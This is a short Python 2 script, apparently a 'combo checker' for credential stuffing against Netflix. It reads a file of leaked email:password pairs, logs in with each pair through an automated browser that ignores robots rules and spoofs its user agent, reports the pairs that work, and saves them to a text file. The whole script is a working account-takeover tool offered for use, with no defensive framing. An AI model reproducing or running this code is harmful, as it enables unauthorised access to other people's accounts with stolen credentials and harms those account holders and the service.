# -*- coding: utf-8 -*-
#python 2
#coder=MRZ(yassin ehab)
#my facebook= www.facebook.com/Yassen.elgowely

import mechanize
import time
driver = mechanize.Browser()
driver.set_handle_equiv(True)
driver.set_handle_redirect(True)
driver.set_handle_referer(True)
driver.set_handle_robots(False)
driver.addheaders = [('User-agent', 'Firefox')]
def netflix():
#   try:
        print('                NETFLIX...')
        USER = []
        PASS = []
        accPass = []
        NO=0
        for i in openn:
            currentline = i.split(':')
            email = currentline[0]
            password = currentline[1]
            USER.append(email)
            PASS.append(password.strip("\n"))
            driver.open('https://www.netflix.com/Login?locale=es-CL')
            driver.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
            driver.select_form(nr=0)
            driver.form['email'] = email
            driver.form['password'] = password
            response = driver.submit()
            if response.geturl() == 'https://www.netflix.com/eg/':
                NO = NO + 1
                print("[+] Found: " +email+":"+password+"")
                accPass.append(currentline[0] + ':' + currentline[1])
                driver.open('https://www.netflix.com/signout?lnkctr=mL')
                print NO
            else:
                NO = NO + 1
                print('{-}NOT FOUND{-}')
                print NO

        print("Writing active accounts to NETFLIX.txt..")
        for all in accPass:
           print(all)
           outfile = open('NETFLIX.txt', 'w')
           outfile.write(str(all) + '\n')
#   except:
#        print("THIER IS ERROR IN COMBO OR NETWORK...")
#        time.sleep(3)
#        menu()
def menu():
    print("""
        ███╗   ███╗██████╗ ███████╗
        ████╗ ████║██╔══██╗╚══███╔╝
        ██╔████╔██║██████╔╝  ███╔╝ 
        ██║╚██╔╝██║██╔══██╗ ███╔╝  
        ██║ ╚═╝ ██║██║  ██║███████╗
        ╚═╝#MRZ ╚═╝╚═╝  ╚═╝╚══════╝
        #SPOOKS,NETFLIX_CHECKER""")
    print("")
    list = raw_input("ENTER COMBO PATH: ")
    global openn
    openn = open(list, "r")
    netflix()
menu()
